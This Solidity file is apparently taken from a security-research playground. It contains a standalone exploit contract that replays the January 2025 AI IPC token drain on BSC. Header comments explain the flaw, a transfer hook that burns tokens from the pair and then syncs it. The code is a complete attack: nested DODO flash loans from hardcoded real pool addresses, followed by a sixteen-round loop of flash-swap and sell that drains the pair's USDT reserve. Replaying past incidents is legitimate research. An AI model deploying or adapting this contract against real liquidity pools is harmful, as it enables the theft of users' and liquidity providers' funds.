// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-01-IPC).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (the DODO flash-loan callbacks `DVMFlashLoanCall`/`DPPFlashLoanCall` and the
// PancakeSwap flash-swap callback `pancakeCall` all live on the test itself),
// so there is no standalone exploit contract to deploy. This contract is a
// faithful, self-contained copy of that inline attack (testExploit + dodoCall +
// pancakeCall + the two DODO callback shims) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/IPC_exp.sol (ContractTest).
//
// Root cause: AI IPC's `_transfer` hook burns IPC directly out of the
// IPC/USDT pair's own balance (down to a 1-token floor) and force-`sync()`s
// the pair on every sell, collapsing the constant-product invariant without
// any compensating USDT leaving the pool. The attacker takes two DODO flash
// loans, then loops: a `pair.swap` flash-swap re-deposits USDT into the pair
// (refilling its USDT reserve and resetting the 30-minute sell timelock),
// then sells the accumulated IPC through the router — each sell first
// triggers `_destroy`, crushing the IPC reserve to ~1 token and paying out
// almost the entire USDT reserve.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniRouterV2 {
    function getAmountsOut(uint256 amountIn, address[] calldata path) external view returns (uint256[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IDODOFlashLoan {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

contract IPCDrain {
    address constant DVM1 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address constant DVM2 = 0x0e15e47C3DE9CD92379703cf18251a2D13E155A7;
    IERC20 constant IPC = IERC20(0xEAb0d46682Ac707A06aEFB0aC72a91a3Fd6Fe5d1);
    IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IUniPairV2 constant pair = IUniPairV2(0xDe3595a72f35d587e96d5C7B6f3E6C02ed2900AB);
    IUniRouterV2 constant router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 constant BORROW_1 = 256285582578788161478508;
    uint256 constant BORROW_2 = 77794276765052816860394;

    // step 0: flash-borrow BORROW_1 USDT from the DODO DVM pool; DVMFlashLoanCall does the rest.
    function run() external {
        (bool success,) = DVM1.call(
            abi.encodeWithSignature("flashLoan(uint256,uint256,address,bytes)", 0, BORROW_1, address(this), "1")
        );
        require(success, "flashloan failed");
    }

    function dodoCall(address, uint256, uint256, bytes memory) public {
        if (msg.sender == DVM1) {
            // step 1: nest a second DODO flash loan (BORROW_2) from DVM2.
            (bool success,) = DVM2.call(
                abi.encodeWithSignature("flashLoan(uint256,uint256,address,bytes)", 0, BORROW_2, address(this), "1")
            );
            require(success, "flashloan failed");
            USDT.transfer(DVM1, BORROW_1);
        }

        if (msg.sender == DVM2) {
            // step 2: now holding BORROW_1 + BORROW_2 USDT, loop the flash-swap + sell 16x.
            address[] memory path = new address[](2);

            for (uint256 i = 0; i < 16; i++) {
                path[0] = address(USDT);
                path[1] = address(IPC);
                uint256 usdtAmount = USDT.balanceOf(address(this)) - 10;
                uint256[] memory values = router.getAmountsOut(usdtAmount, path);

                // flash-swap 1 wei of USDT out (bypasses the 30-min sell timelock via
                // the router-buy path inside pancakeCall, which sets transferTime).
                pair.swap(1, values[1], address(this), abi.encode(usdtAmount));

                // sell all accumulated IPC back to USDT — this is where `_destroy`
                // fires and crushes the pair's IPC reserve to ~1 token before the
                // sale settles, paying out almost the entire USDT reserve.
                IPC.approve(address(router), type(uint256).max);
                path[0] = address(IPC);
                path[1] = address(USDT);
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    IPC.balanceOf(address(this)), 0, path, address(this), block.timestamp
                );

                path[0] = address(USDT);
                path[1] = address(IPC);
            }

            // step 3: repay the second flash loan.
            USDT.transfer(DVM2, BORROW_2);
        }
    }

    function pancakeCall(address, uint256, uint256, bytes memory data) public {
        uint256 usdtAmount = abi.decode(data, (uint256));
        // repay the flash-swap (+1 wei covers the 1 wei of USDT pulled out).
        USDT.transfer(address(pair), usdtAmount + 1);
    }

    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        dodoCall(sender, baseAmount, quoteAmount, data);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        dodoCall(sender, baseAmount, quoteAmount, data);
    }

    receive() external payable {}
}
